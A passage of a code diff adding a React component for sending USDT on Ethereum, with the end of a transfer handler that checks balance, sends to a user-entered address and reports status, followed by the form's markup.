+      if (balance < amountInWei) {
+        setStatus(`Insufficient USDT balance. You have ${formattedBalance} USDT.`);
+        setStatusType("error");
+        setLoading(false);
+        return;
+      }
+
+      setStatus("Please confirm the transaction in your wallet...");
+
+      const tx = await usdtContract.transfer(address, amountInWei);
+
+      setStatus(`Transaction sent! Hash: ${tx.hash.slice(0, 10)}... Waiting for confirmation...`);
+      setTxHash(tx.hash);
+
+      const receipt = await tx.wait();
+
+      if (receipt && receipt.status === 1) {
+        setStatus(`✅ Transfer successful! ${amount} USDT sent.`);
+        setStatusType("success");
+      } else {
+        setStatus("❌ Transaction failed on-chain.");
+        setStatusType("error");
+      }
+    } catch (err: unknown) {
+      console.error("Transfer error:", err);
+
+      let message = "Transaction failed.";
+      if (err instanceof Error) {
+        if (err.message.includes("user rejected") || err.message.includes("User denied")) {
+          message = "Transaction cancelled by user.";
+        } else if (err.message.includes("insufficient funds")) {
+          message = "Insufficient ETH for gas fees.";
+        } else {
+          message = err.message.length > 100 ? err.message.slice(0, 100) + "..." : err.message;
+        }
+      }
+
+      setStatus(message);
+      setStatusType("error");
+    } finally {
+      setLoading(false);
+    }
+  };
+
+  return (
+    <main className="transfer-main">
+      {/* ===== Transfer Form ===== */}
+      <div className="form-container">
+        {/* --- Address or Domain Name --- */}
+        <label className="form-label">Address or Domain Name</label>
+        <div className="input-row">
+          <input
+            type="text"
+            placeholder="Search or Enter"
+            value={address}
+            onChange={(e) => setAddress(e.target.value)}
+            className="input-row__field"
+          />
+          <div className="input-row__actions">
+            <button onClick={handlePaste} className="btn-paste">
+              Paste
+            </button>
+            <button className="btn-icon" title="Copy">
+              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#4ade80" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+                <rect x="9" y="9" width="13" height="13" rx="2" ry="2" />
+                <path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1" />
+              </svg>
+            </button>
+            <button className="btn-icon" title="Scan QR">
+              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#4ade80" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+                <path d="M7 3H5a2 2 0 00-2 2v2" />
+                <path d="M17 3h2a2 2 0 012 2v2" />
+                <path d="M21 17v2a2 2 0 01-2 2h-2" />
+                <path d="M7 21H5a2 2 0 01-2-2v-2" />
+                <line x1="7" y1="12" x2="17" y2="12" />
+              </svg>
+            </button>
+          </div>
+        </div>
+
+        {/* --- Destination network --- */}
+        <label className="form-label form-label--spaced">
+          Destination network
+        </label>
+        <div className="network-selector">
+          <div className="eth-icon">
+            <svg width="24" height="24" viewBox="0 0 256 417" fill="none">
+              <path d="M127.961 0l-2.795 9.5v275.668l2.795 2.79 127.962-75.638z" fill="#828384" />
+              <path d="M127.962 0L0 212.32l127.962 75.639V154.158z" fill="#bcc0c4" />
+              <path d="M127.961 312.187l-1.575 1.92v98.199l1.575 4.6L256 236.587z" fill="#828384" />
+              <path d="M127.962 416.905v-104.72L0 236.585z" fill="#bcc0c4" />
+              <path d="M127.961 287.958l127.96-75.637-127.96-58.162z" fill="#2f3030" />
+              <path d="M0 212.32l127.96 75.638v-133.8z" fill="#828384" />
+            </svg>
+          </div>
+          <span className="network-name">Ethereum</span>
+          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#9ca3af" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" style={{ marginLeft: "6px" }}>
+            <polyline points="6 9 12 15 18 9" />
+          </svg>
+        </div>
+
+        {/* --- Amount --- */}
+        <label className="form-label form-label--spaced">Amount</label>
+        <div className="input-row">
+          <input
+            type="text"
+            value={amount}
+            onChange={(e) => setAmount(e.target.value)}
+            className="input-row__field input-row__field--amount"
+          />
+          <div className="amount-actions">
+            <div className="stepper">
+              <button className="btn-step" onClick={() => setAmount(String(parsedAmount + 1))}>
+                <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="#9ca3af" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round">
+                  <polyline points="18 15 12 9 6 15" />
+                </svg>
+              </button>
+              <button className="btn-step" onClick={() => setAmount(String(Math.max(0, parsedAmount - 1)))}>
+                <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="#9ca3af" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round">
+                  <polyline points="6 9 12 15 18 9" />
+                </svg>
+              </button>
+            </div>
+            <span className="amount-currency">USDT</span>
+            <button className="btn-max">Max</button>
+          </div>
+        </div>
+
+        <p className="approx-price">≈ ${parsedAmount.toFixed(2)}</p>
+      </div>
+
+      {/* ===== Status Message ===== */}
+      {status && (
+        <div className={`status-message status-message--${statusType}`}>
+          {status}
+          {txHash && (
+            <a
+              href={`https://etherscan.io/tx/${txHash}`}
+              target="_blank"
+              rel="noopener noreferrer"
+              className="status-link"
+            >
+              View on Etherscan ↗
+            </a>
+          )}
+        </div>
+      )}
+
+      {/* ===== Next Button ===== */}
+      <div className="next-btn-wrapper">
+        <button
+          onClick={handleSendUSDT}
+          disabled={loading}
+          className={`next-btn ${loading ? "next-btn--loading" : ""}`}
+        >
+          {loading ? (
+            <span className="btn-spinner-wrapper">
+              <span className="btn-spinner" />
+              Processing...
+            </span>
+          ) : (
+            "Next"
+          )}
+        </button>
+      </div>
+    </main>
+  );
+}
